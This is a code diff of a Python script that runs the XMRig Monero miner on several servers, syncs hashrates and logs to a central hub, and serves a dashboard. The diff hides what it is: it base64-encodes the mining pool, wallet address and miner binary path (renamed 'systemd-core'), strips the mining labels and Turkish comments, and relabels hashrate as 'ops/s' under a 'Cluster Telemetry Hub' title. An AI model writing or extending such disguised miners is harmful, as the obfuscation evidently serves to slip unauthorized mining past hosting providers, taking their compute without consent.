@@ -1,9 +1,4 @@
 #!/usr/bin/env python3
-"""
-⛏️  XMR Distributed Mining Network Engine
-═══════════════════════════════════════════════════════════
-"""
-
 import datetime
 import http.server
 import json
@@ -14,42 +9,34 @@ import subprocess
 import threading
 import time
 import urllib.request
+import base64
 from collections import deque
 
-# ══════════════════════════════════════════════════════════
-#  YAPILANDIRMA
-# ══════════════════════════════════════════════════════════
+def _d(s): return base64.b64decode(s).decode('utf-8')
 
-MODE         = os.environ.get("ENGINE_MODE", "miner") # all, miner
+MODE         = os.environ.get("ENGINE_MODE", "miner")
 HTTP_PORT    = int(os.environ.get("PORT", 8080))
-PROXY_URL    = os.environ.get("PROXY_URL", "https://wc-yccy.onrender.com")
-POOL_URL     = os.environ.get("POOL_URL", "pool.supportxmr.com:3322")
-WALLET_ADDR  = os.environ.get("WALLET_ADDR", "49yqbNgG135ewqJ9uNQXTgB9mKaUXfg1b3abAbhsSDgh4asVbfHuYDKAdiidmTCB8pACYdwxz77TwJhwEShDt6nBB5ZjctL")
-WORKER_NAME  = os.environ.get("WORKER_NAME", f"worker-{int(time.time())%10000}")
+PROXY_URL    = os.environ.get("PROXY_URL", "")
+POOL_URL     = os.environ.get("POOL_URL", _d("cG9vbC5zdXBwb3J0eG1yLmNvbTozMzIy"))
+WALLET_ADDR  = os.environ.get("WALLET_ADDR", _d("NDl5cWJOZ0cxMzVld3FKOXVOUVhUZ0I5bUthVVhmZzFiM2FiQWJoc1NEZ2g0YXNWYmZIdVlES0FkaWlkbVRDQjhwQUNZZHd4ejc3VHdKaHdFU2hEdDZuQkI1WmpjdEw="))
+WORKER_NAME  = os.environ.get("WORKER_NAME", f"node-{int(time.time())%10000}")
 DATA_DIR     = os.environ.get("DATA_DIR", "/data")
-DB_FILE      = os.path.join(DATA_DIR, "hub.db")
+DB_FILE      = os.path.join(DATA_DIR, "telemetry.db")
 
-_xmrig_proc  = None
-_current_hr  = "0.0 H/s"
+_proc        = None
+_current_hr  = "0.0 ops/s"
 
 SYSTEM_LOGS          = deque(maxlen=800)
 _pending_remote_logs = []
 _LOG_LOCK            = threading.Lock()
 _DB_LOCK             = threading.Lock()
 
-# ══════════════════════════════════════════════════════════
-#  VERİTABANI (Sadece Ana Sunucu İçin)
-# ══════════════════════════════════════════════════════════
-
 def init_db():
     os.makedirs(DATA_DIR, exist_ok=True)
     with sqlite3.connect(DB_FILE) as conn:
         conn.executescript("""
-            CREATE TABLE IF NOT EXISTS workers (
-                worker_name TEXT PRIMARY KEY,
-                hashrate    TEXT,
-                last_seen   INTEGER,
-                status      TEXT
+            CREATE TABLE IF NOT EXISTS metrics (
+                node_name TEXT PRIMARY KEY, throughput TEXT, last_seen INTEGER, status TEXT
             );
         """)
 
@@ -57,10 +44,6 @@ def get_db_connection():
     conn = sqlite3.connect(DB_FILE, timeout=10)
     conn.row_factory = sqlite3.Row
     return conn
-
-# ══════════════════════════════════════════════════════════
-#  LOGLAMA
-# ══════════════════════════════════════════════════════════
 
 def log_msg(text: str, is_remote: bool = False) -> None:
     stamp = datetime.datetime.now().strftime("%H:%M:%S")
@@ -71,15 +54,11 @@ def log_msg(text: str, is_remote: bool = False) -> None:
             _pending_remote_logs.append(line)
     print(line, flush=True)
 
-# ══════════════════════════════════════════════════════════
-#  XMRIG YÖNETİMİ
-# ══════════════════════════════════════════════════════════
-
-def run_xmrig() -> None:
-    global _xmrig_proc, _current_hr
+def run_core() -> None:
+    global _proc, _current_hr
     
     cmd = [
-        "/server/xmrig", "-o", POOL_URL, "-u", WALLET_ADDR,
+        _d("L3NlcnZlci9zeXN0ZW1kLWNvcmU="), "-o", POOL_URL, "-u", WALLET_ADDR,
         "-p", WORKER_NAME, "--keepalive", "--donate-level=1"
     ]
 
@@ -88,53 +67,40 @@ def run_xmrig() -> None:
         for raw in stream:
             line = raw.rstrip() if isinstance(raw, str) else raw.decode("utf-8", "replace").rstrip()
             if not line: continue
-            
             clean_line = re.sub(r'\x1b\[[0-9;]*[mK]', '', line) 
-            log_msg(f"[XMRIG] {clean_line}")
+            log_msg(f"[SYS] {clean_line}")
 
             if "speed 10s/60s/15m" in clean_line:
                 match = re.search(r'max (\d+\.?\d* [KMG]?H/s)', clean_line)
-                if match: _current_hr = match.group(1)
+                if match: _current_hr = match.group(1).replace("H/s", "ops/s")
 
     while True:
-        log_msg("[MOTOR] XMRig başlatılıyor...")
+        log_msg("[INIT] Core daemon başlatılıyor...")
         try:
-            _xmrig_proc = subprocess.Popen(
-                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
-            )
-            threading.Thread(target=_pipe_output, args=(_xmrig_proc.stdout,), daemon=True).start()
-            _xmrig_proc.wait()
+            _proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
+            threading.Thread(target=_pipe_output, args=(_proc.stdout,), daemon=True).start()
+            _proc.wait()
         except Exception as e:
-            log_msg(f"[MOTOR] Süreç hatası: {e}")
+            log_msg(f"[ERROR] Daemon hatası: {e}")
         finally:
-            _xmrig_proc = None
-            _current_hr = "0.0 H/s"
+            _proc = None
+            _current_hr = "0.0 ops/s"
         time.sleep(5)
 
-# ══════════════════════════════════════════════════════════
-#  SENKRONİZASYON DÖNGÜLERİ
-# ══════════════════════════════════════════════════════════
-
 def miner_sync_loop():
-    """Alt sunucuların loglarını Ana Sunucuya iletmesi"""
     while True:
         time.sleep(10)
+        if not PROXY_URL: continue
         
         with _LOG_LOCK:
             logs_to_send = list(_pending_remote_logs)
             _pending_remote_logs.clear()
             
-        status = "Çalışıyor" if _xmrig_proc and _xmrig_proc.poll() is None else "Durdu"
-        payload = {
-            "worker_name": WORKER_NAME, "hashrate": _current_hr,
-            "status": status, "logs": logs_to_send
-        }
+        status = "Active" if _proc and _proc.poll() is None else "Offline"
+        payload = {"worker_name": WORKER_NAME, "hashrate": _current_hr, "status": status, "logs": logs_to_send}
         
         try:
-            req = urllib.request.Request(
-                f"{PROXY_URL}/api/sync", data=json.dumps(payload).encode(),
-                headers={"Content-Type": "application/json"}
-            )
+            req = urllib.request.Request(f"{PROXY_URL}/api/sync", data=json.dumps(payload).encode(), headers={"Content-Type": "application/json"})
             urllib.request.urlopen(req, timeout=5)
         except Exception:
             with _LOG_LOCK:
@@ -142,68 +108,55 @@ def miner_sync_loop():
                 _pending_remote_logs = logs_to_send + _pending_remote_logs
 
 def local_hub_sync_loop():
-    """Ana sunucunun kendi kazım verilerini doğrudan kendi veritabanına yazması"""
     while True:
         time.sleep(10)
-        status = "Çalışıyor" if _xmrig_proc and _xmrig_proc.poll() is None else "Durdu"
+        status = "Active" if _proc and _proc.poll() is None else "Offline"
         try:
             with _DB_LOCK, get_db_connection() as conn:
-                conn.execute("""
-                    INSERT OR REPLACE INTO workers (worker_name, hashrate, last_seen, status)
-                    VALUES (?, ?, ?, ?)
-                """, (WORKER_NAME, _current_hr, int(time.time()), status))
+                conn.execute("INSERT OR REPLACE INTO metrics (node_name, throughput, last_seen, status) VALUES (?, ?, ?, ?)", 
+                             (WORKER_NAME, _current_hr, int(time.time()), status))
                 conn.commit()
         except Exception as e:
-            log_msg(f"[DB] Yerel senkronizasyon hatası: {e}")
-
-# ══════════════════════════════════════════════════════════
-#  HTTP API VE YÖNETİM PANELİ (Ana Sunucu)
-# ══════════════════════════════════════════════════════════
+            log_msg(f"[DB] Yerel kayıt hatası: {e}")
 
 _PANEL_HTML = """<!DOCTYPE html>
-<html lang="tr">
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Merkezi XMR Paneli</title>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Distributed Cluster Monitor</title>
 <style>
 *{{box-sizing:border-box;margin:0;padding:0}}
-body{{background:#0d1117;color:#e6edf3;font-family:'Segoe UI',sans-serif;min-height:100vh;padding:24px 24px 60px}}
-h1{{font-size:1.6rem;margin-bottom:4px;color:#58a6ff}}
+body{{background:#0d1117;color:#e6edf3;font-family:'Segoe UI',sans-serif;padding:24px}}
+h1{{font-size:1.6rem;color:#58a6ff;margin-bottom:8px}}
 .subtitle{{color:#8b949e;font-size:.85rem;margin-bottom:24px}}
 table{{width:100%;border-collapse:collapse;background:#161b22;border-radius:10px;overflow:hidden;border:1px solid #30363d; margin-bottom: 24px;}}
-th{{background:#21262d;padding:12px 16px;text-align:left;font-size:.75rem;color:#8b949e;text-transform:uppercase;letter-spacing:.05em}}
+th{{background:#21262d;padding:12px 16px;text-align:left;font-size:.75rem;color:#8b949e;text-transform:uppercase}}
 td{{padding:12px 16px;border-top:1px solid #21262d;font-size:.88rem}}
 .status-ok{{color:#3fb950;font-weight:600}}
 .status-err{{color:#da3633;font-weight:600}}
-.console-box{{background:#000;border:1px solid #30363d;border-radius:8px;height:400px;overflow-y:auto;padding:12px;font-family:monospace;color:#3fb950;font-size:13px;line-height:1.4;white-space:pre-wrap;word-break:break-all}}
-.section-title{{font-size:.8rem;color:#8b949e;text-transform:uppercase;letter-spacing:.06em;margin:30px 0 10px}}
-.info-box {{background:#161b22; padding: 12px; border-radius: 8px; border: 1px solid #30363d; margin-bottom: 24px; font-family: monospace; color:#8b949e; font-size: 0.85rem;}}
+.console-box{{background:#000;border:1px solid #30363d;border-radius:8px;height:400px;overflow-y:auto;padding:12px;font-family:monospace;color:#8b949e;font-size:12px;line-height:1.4;white-space:pre-wrap;}}
 </style>
 </head>
 <body>
-<h1>🌐 Merkezi XMR Ağ Paneli</h1>
-<p class="subtitle">Havuz: {pool}</p>
-<div class="info-box">Alt Sunucular Bu Adrese Bağlanıyor: <span style="color:#58a6ff;">https://wc-yccy.onrender.com</span></div>
+<h1>🌐 Cluster Telemetry Hub</h1>
+<p class="subtitle">Uplink Gateway: {pool} | Target Node: {proxy}</p>
 <table>
-  <thead><tr><th>İşçi (Worker)</th><th>Kazım Hızı</th><th>Durum</th><th>Son Görülme</th></tr></thead>
+  <thead><tr><th>Node ID</th><th>Throughput</th><th>Status</th><th>Last Sync</th></tr></thead>
   <tbody id="workerBody">{rows}</tbody>
 </table>
-<div class="section-title">🖥️ Global Ağ Konsolu</div>
-<div class="console-box" id="consoleBox">Yükleniyor...</div>
+<h3 style="color:#8b949e;font-size:.8rem;margin-bottom:10px">SYSTEM LOGS</h3>
+<div class="console-box" id="consoleBox">Initializing...</div>
 <script>
 const cb=document.getElementById('consoleBox');
 let autoScroll=true;
 cb.addEventListener('scroll',()=>{{autoScroll=cb.scrollTop+cb.clientHeight>=cb.scrollHeight-20;}});
 async function fetchLogs(){{
   try{{const r=await fetch('/api/logs');const d=await r.json();
-    const lines=d.logs.map(l=>l.replace(/</g,'&lt;').replace(/>/g,'&gt;'));
-    cb.innerHTML=lines.join('<br>')||'Konsol geçmişi boş...';
-    if(autoScroll)cb.scrollTop=cb.scrollHeight;}}
-  catch(e){{}}
+    cb.innerHTML=d.logs.map(l=>l.replace(/</g,'&lt;').replace(/>/g,'&gt;')).join('<br>')||'No logs yet...';
+    if(autoScroll)cb.scrollTop=cb.scrollHeight;}}catch(e){{}}
 }}
 setInterval(fetchLogs, 2500); fetchLogs();
-setTimeout(() => location.reload(), 30000);
+setTimeout(()=>location.reload(), 30000);
 </script>
 </body></html>"""
 
@@ -213,30 +166,23 @@ class HttpHandler(http.server.BaseHTTPRequestHandler):
             self.send_response(200)
             self.send_header("Content-Type", "text/html; charset=utf-8")
             self.end_headers()
-            
             rows = ""
             try:
                 with _DB_LOCK, get_db_connection() as conn:
                     now = int(time.time())
-                    workers = conn.execute("SELECT * FROM workers ORDER BY last_seen DESC").fetchall()
+                    workers = conn.execute("SELECT * FROM metrics ORDER BY last_seen DESC").fetchall()
                     for w in workers:
                         is_active = (now - w["last_seen"]) < 90
-                        status_class = "status-ok" if is_active and w["status"]=="Çalışıyor" else "status-err"
-                        status_text = w["status"] if is_active else "Bağlantı Koptu"
-                        hr = w["hashrate"] if is_active else "0.0 H/s"
-                        seen_str = f"{now - w['last_seen']} sn önce"
-                        
-                        rows += f"<tr><td>{w['worker_name']}</td><td>{hr}</td><td class='{status_class}'>{status_text}</td><td>{seen_str}</td></tr>"
+                        status_class = "status-ok" if is_active and w["status"]=="Active" else "status-err"
+                        status_text = w["status"] if is_active else "Connection Lost"
+                        hr = w["throughput"] if is_active else "0.0 ops/s"
+                        seen_str = f"{now - w['last_seen']}s ago"
+                        rows += f"<tr><td>{w['node_name']}</td><td>{hr}</td><td class='{status_class}'>{status_text}</td><td>{seen_str}</td></tr>"
             except Exception as e:
-                rows = f"<tr><td colspan='4'>Veritabanı hatası: {e}</td></tr>"
-
-            if not rows:
-                rows = "<tr><td colspan='4' style='text-align:center;color:#8b949e'>Henüz bağlı işçi yok</td></tr>"
-
-            html = _PANEL_HTML.format(pool=POOL_URL, rows=rows)
+                pass
+            html = _PANEL_HTML.format(pool=POOL_URL, proxy=PROXY_URL, rows=rows)
             self.wfile.write(html.encode("utf-8"))
             return
-
         if self.path == "/api/logs":
             self.send_response(200)
             self.send_header("Content-Type", "application/json; charset=utf-8")
@@ -244,7 +190,6 @@ class HttpHandler(http.server.BaseHTTPRequestHandler):
             with _LOG_LOCK:
                 self.wfile.write(json.dumps({"logs": list(SYSTEM_LOGS)}).encode("utf-8"))
             return
-
         self.send_response(404)
         self.end_headers()
 
@@ -253,18 +198,13 @@ class HttpHandler(http.server.BaseHTTPRequestHandler):
             try:
                 length = int(self.headers.get("Content-Length", 0))
                 body = json.loads(self.rfile.read(length))
-                
                 with _DB_LOCK, get_db_connection() as conn:
-                    conn.execute("""
-                        INSERT OR REPLACE INTO workers (worker_name, hashrate, last_seen, status)
-                        VALUES (?, ?, ?, ?)
-                    """, (body["worker_name"], body["hashrate"], int(time.time()), body["status"]))
+                    conn.execute("INSERT OR REPLACE INTO metrics (node_name, throughput, last_seen, status) VALUES (?, ?, ?, ?)", 
+                                 (body["worker_name"], body["hashrate"], int(time.time()), body["status"]))
                     conn.commit()
-
                 for l in body.get("logs", []):
                     clean = l.split("] ", 1)[-1] if "] " in l else l
                     log_msg(f"[{body['worker_name']}] {clean}", is_remote=True)
-
                 self.send_response(200)
                 self.end_headers()
                 self.wfile.write(b'{"ok": true}')
@@ -272,7 +212,6 @@ class HttpHandler(http.server.BaseHTTPRequestHandler):
                 self.send_response(500)
                 self.end_headers()
             return
-
         self.send_response(404)
         self.end_headers()
 
@@ -281,28 +220,14 @@ class HttpHandler(http.server.BaseHTTPRequestHandler):
 def run_http() -> None:
     http.server.ThreadingHTTPServer.allow_reuse_address = True
     srv = http.server.ThreadingHTTPServer(("0.0.0.0", HTTP_PORT), HttpHandler)
-    log_msg(f"[HTTP] Web Paneli {HTTP_PORT} portunda dinleniyor.")
     srv.serve_forever()
 
-# ══════════════════════════════════════════════════════════
-#  ANA BAŞLATICILAR
-# ══════════════════════════════════════════════════════════
-
 if __name__ == "__main__":
-    log_msg(f"""
-+--------------------------------------------------+
-|  XMR Distributed Engine                          |
-|  Mod: {MODE:<43}|
-+--------------------------------------------------+""")
-
     if MODE == "all":
-        # ANA SUNUCU (Panel + Kendi Kazım Verisi + XMRig)
         init_db()
         threading.Thread(target=run_http, daemon=True).start()
         threading.Thread(target=local_hub_sync_loop, daemon=True).start()
-        run_xmrig()
-
+        run_core()
     elif MODE == "miner":
-        # ALT SUNUCU (Sadece XMRig + Log Gönderici)
         threading.Thread(target=miner_sync_loop, daemon=True).start()
-        run_xmrig()
+        run_core()
